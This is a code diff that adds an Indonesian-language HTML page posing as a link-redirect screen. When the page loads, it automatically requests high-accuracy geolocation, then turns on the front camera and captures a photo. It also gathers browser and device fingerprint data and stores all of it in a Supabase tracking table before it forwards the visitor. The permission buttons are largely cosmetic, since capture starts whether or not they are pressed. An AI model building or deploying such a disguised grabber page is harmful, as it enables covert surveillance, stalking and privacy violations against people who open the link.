@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mengarahkan...</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #4a6fa5, #166088);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        
+        .container {
+            max-width: 500px;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        }
+        
+        h1 {
+            margin-bottom: 20px;
+            font-size: 1.8rem;
+        }
+        
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .message {
+            margin: 20px 0;
+            font-size: 1.1rem;
+        }
+        
+        .permission-request {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        
+        .btn {
+            background: #4fc3a1;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            margin: 5px;
+            transition: background 0.3s;
+        }
+        
+        .btn:hover {
+            background: #3da58a;
+        }
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        
+        .error {
+            color: #ff6b6b;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        
+        .success {
+            color: #4fc3a1;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: #4fc3a1;
+            border-radius: 3px;
+            transition: width 0.3s ease;
+        }
+    </style>
+    <!-- Supabase CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+<body>
+    <div class="container">
+        <h1 id="page-title">Mempersiapkan Pengalihan</h1>
+        <div class="loader" id="loader"></div>
+        <div class="progress-bar">
+            <div class="progress" id="progress" style="width: 0%"></div>
+        </div>
+        <div class="message" id="status-message">Memeriksa link...</div>
+        
+        <div id="permission-section" style="display: none;">
+            <div class="permission-request">
+                <p>Untuk pengalaman terbaik, izinkan akses ke:</p>
+                <button id="allow-camera" class="btn">📷 Izinkan Kamera</button>
+                <button id="allow-location" class="btn">📍 Izinkan Lokasi</button>
+                <button id="skip-permissions" class="btn btn-secondary">⏩ Lewati Izin</button>
+            </div>
+        </div>
+        
+        <div id="success-section" class="success" style="display: none;">
+            <p>✅ Data berhasil disimpan!</p>
+            <p>Mengalihkan ke tujuan...</p>
+        </div>
+        
+        <div id="error-section" class="error" style="display: none;">
+            <p id="error-message"></p>
+            <button id="retry-btn" class="btn">🔄 Coba Lagi</button>
+            <button id="continue-btn" class="btn btn-secondary">➡️ Lanjutkan Tanpa Tracking</button>
+        </div>
+    </div>
+
+    <script src="supabase-config.js"></script>
+    <script>
+        // Data tracking
+        let trackingData = {
+            trackId: null,
+            linkName: null,
+            timestamp: new Date().toISOString(),
+            location: null,
+            photo: null,
+            ip: null,
+            device: navigator.platform,
+            browser: navigator.userAgent,
+            userAgent: navigator.userAgent,
+            screen: `${screen.width}x${screen.height}`,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        
+        // Elemen DOM
+        const pageTitle = document.getElementById('page-title');
+        const loader = document.getElementById('loader');
+        const progress = document.getElementById('progress');
+        const statusMessage = document.getElementById('status-message');
+        const permissionSection = document.getElementById('permission-section');
+        const successSection = document.getElementById('success-section');
+        const errorSection = document.getElementById('error-section');
+        const errorMessage = document.getElementById('error-message');
+        const allowCameraBtn = document.getElementById('allow-camera');
+        const allowLocationBtn = document.getElementById('allow-location');
+        const skipPermissionsBtn = document.getElementById('skip-permissions');
+        const retryBtn = document.getElementById('retry-btn');
+        const continueBtn = document.getElementById('continue-btn');
+        
+        let destinationUrl = null;
+        let currentProgress = 0;
+        
+        // Fungsi untuk update progress bar
+        function updateProgress(percent) {
+            currentProgress = percent;
+            progress.style.width = `${percent}%`;
+        }
+        
+        // Fungsi untuk menampilkan error
+        function showError(message) {
+            loader.style.display = 'none';
+            progress.style.display = 'none';
+            statusMessage.style.display = 'none';
+            errorMessage.textContent = message;
+            errorSection.style.display = 'block';
+        }
+        
+        // Fungsi untuk menampilkan sukses
+        function showSuccess() {
+            loader.style.display = 'none';
+            progress.style.display = 'none';
+            statusMessage.style.display = 'none';
+            permissionSection.style.display = 'none';
+            successSection.style.display = 'block';
+        }
+        
+        // Fungsi untuk memulai proses tracking dengan Supabase
+        async function startTracking() {
+            updateProgress(10);
+            const urlParams = new URLSearchParams(window.location.search);
+            const trackId = urlParams.get('track');
+            
+            if (!trackId) {
+                showError('Link tracking tidak valid: parameter track tidak ditemukan');
+                return;
+            }
+            
+            trackingData.trackId = trackId;
+            statusMessage.textContent = 'Memverifikasi link...';
+            
+            try {
+                // Dapatkan data link dari Supabase
+                updateProgress(30);
+                const result = await TrackingDB.getLinkById(trackId);
+                
+                if (!result.success) {
+                    showError('Link tracking tidak ditemukan atau telah dihapus');
+                    return;
+                }
+                
+                const link = result.data;
+                trackingData.linkName = link.name;
+                destinationUrl = link.destination;
+                
+                updateProgress(50);
+                statusMessage.textContent = 'Link valid! Mengumpulkan data...';
+                
+                // Langsung mulai proses tanpa menunggu
+                setTimeout(() => {
+                    startDataCollection();
+                }, 1000);
+                
+            } catch (error) {
+                console.error('Error getting link:', error);
+                showError('Error: ' + error.message);
+            }
+        }
+        
+        // Fungsi untuk mulai pengumpulan data
+        function startDataCollection() {
+            updateProgress(60);
+            permissionSection.style.display = 'block';
+            statusMessage.textContent = 'Meminta izin untuk data tambahan...';
+            
+            // Otomatis coba dapatkan lokasi
+            getLocation();
+        }
+        
+        // Fungsi untuk mendapatkan lokasi
+        function getLocation() {
+            if (navigator.geolocation) {
+                updateProgress(70);
+                statusMessage.textContent = 'Mencoba mendapatkan lokasi...';
+                
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        trackingData.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed
+                        };
+                        updateProgress(80);
+                        statusMessage.textContent = 'Lokasi berhasil didapatkan!';
+                        // Lanjut ke kamera
+                        setTimeout(takePhoto, 500);
+                    },
+                    error => {
+                        console.log('Tidak dapat mendapatkan lokasi:', error);
+                        updateProgress(80);
+                        statusMessage.textContent = 'Tidak dapat lokasi. Melanjutkan...';
+                        // Lanjut ke kamera meski lokasi gagal
+                        setTimeout(takePhoto, 500);
+                    },
+                    { 
+                        timeout: 10000,
+                        enableHighAccuracy: true 
+                    }
+                );
+            } else {
+                updateProgress(80);
+                statusMessage.textContent = 'Geolocation tidak didukung. Melanjutkan...';
+                setTimeout(takePhoto, 500);
+            }
+        }
+        
+        // Fungsi untuk mengambil foto
+        function takePhoto() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                updateProgress(90);
+                statusMessage.textContent = 'Mencoba mengakses kamera...';
+                
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    statusMessage.textContent = 'Kamera diakses. Mengambil foto...';
+                    
+                    // Tunggu sebentar agar kamera siap
+                    setTimeout(() => {
+                        try {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            // Konversi ke data URL dengan kualitas lebih baik
+                            trackingData.photo = canvas.toDataURL('image/jpeg', 0.8);
+                            
+                            // Hentikan stream
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            statusMessage.textContent = 'Foto berhasil diambil!';
+                            setTimeout(saveAndRedirect, 500);
+                            
+                        } catch (error) {
+                            console.error('Error taking photo:', error);
+                            statusMessage.textContent = 'Error mengambil foto. Melanjutkan...';
+                            setTimeout(saveAndRedirect, 500);
+                        }
+                    }, 1500);
+                })
+                .catch(error => {
+                    console.log('Tidak dapat mengakses kamera:', error);
+                    statusMessage.textContent = 'Tidak dapat akses kamera. Melanjutkan...';
+                    setTimeout(saveAndRedirect, 500);
+                });
+            } else {
+                statusMessage.textContent = 'Kamera tidak didukung. Melanjutkan...';
+                setTimeout(saveAndRedirect, 500);
+            }
+        }
+        
+        // Fungsi untuk menyimpan data dan redirect dengan Supabase
+        async function saveAndRedirect() {
+            updateProgress(95);
+            statusMessage.textContent = 'Menyimpan data tracking...';
+            
+            try {
+                // Simpan ke Supabase
+                const result = await TrackingDB.saveResult(trackingData);
+                
+                if (result.success) {
+                    updateProgress(100);
+                    showSuccess();
+                    
+                    // Redirect setelah 2 detik
+                    setTimeout(() => {
+                        if (destinationUrl) {
+                            window.location.href = destinationUrl;
+                        } else {
+                            showError('URL tujuan tidak ditemukan');
+                        }
+                    }, 2000);
+                } else {
+                    throw new Error(result.error);
+                }
+                
+            } catch (error) {
+                console.error('Error saving tracking data:', error);
+                // Meski error save, tetap redirect
+                setTimeout(() => {
+                    if (destinationUrl) {
+                        window.location.href = destinationUrl;
+                    }
+                }, 2000);
+            }
+        }
+        
+        // Event listeners
+        allowCameraBtn.addEventListener('click', takePhoto);
+        allowLocationBtn.addEventListener('click', getLocation);
+        skipPermissionsBtn.addEventListener('click', saveAndRedirect);
+        
+        retryBtn.addEventListener('click', () => {
+            errorSection.style.display = 'none';
+            loader.style.display = 'block';
+            progress.style.display = 'block';
+            statusMessage.style.display = 'block';
+            statusMessage.textContent = 'Memulai ulang...';
+            updateProgress(0);
+            setTimeout(startTracking, 1000);
+        });
+        
+        continueBtn.addEventListener('click', () => {
+            if (destinationUrl) {
+                window.location.href = destinationUrl;
+            } else {
+                showError('Tidak dapat melanjutkan: URL tujuan tidak tersedia');
+            }
+        });
+        
+        // Mulai proses tracking saat halaman dimuat
+        document.addEventListener('DOMContentLoaded', function() {
+            // Simpan IP address (dalam implementasi real, ini dari server)
+            trackingData.ip = '192.168.1.1';
+            
+            setTimeout(startTracking, 1000);
+        });
+    </script>
+</body>
+</html>
